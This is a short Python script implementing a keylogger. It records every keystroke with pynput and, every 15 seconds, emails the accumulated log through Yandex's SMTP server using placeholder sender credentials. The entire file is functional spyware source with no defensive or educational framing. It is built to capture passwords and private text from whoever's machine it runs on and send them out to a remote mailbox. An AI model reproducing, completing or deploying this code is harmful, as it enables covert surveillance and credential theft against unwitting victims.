import pynput.keyboard
import smtplib
import threading

log = ""

def callback_function(key):
    global log
    try:
        log = log + str(key.char)
        #log = log + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + ""
        else:
            log = log + str(key)
    except:
        pass

    print(log)

sender_email = "sendermail@mail.com"
receiver_email = "receivermail@mail.com"
password = "your_password"


def send_mail(message):
    email_sever = smtplib.SMTP("smtp.yandex.com",587)
    email_sever.starttls()
    email_sever.login(sender_email,password)
    email_sever.sendmail(sender_email,sender_email,message)
    email_sever.quit()


def thread_function():
    global log
    send_mail(log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(15,thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)



with keylogger_listener:
    thread_function()
    keylogger_listener.join()